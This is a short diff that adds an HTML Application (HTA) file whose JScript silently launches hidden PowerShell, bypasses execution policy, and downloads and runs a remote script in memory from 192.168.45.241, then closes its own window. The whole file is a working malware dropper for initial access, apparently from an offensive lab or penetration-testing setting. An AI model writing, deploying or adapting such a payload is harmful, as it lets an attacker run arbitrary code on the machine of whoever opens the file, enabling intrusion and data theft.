@@ -1,0 +1,18 @@
+<html>
+<head>
+<script language="JScript">
+try {
+    var shell = new ActiveXObject("WScript.Shell");
+    // Download and execute payload in memory via PowerShell — no disk write
+    shell.Run("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.241/payload.ps1')\"", 0, false);
+} catch (e) {
+    shell.Run("cmd.exe /c echo HTA error: " + e.message + " > C:\\hta_error.txt", 0, false);
+}
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
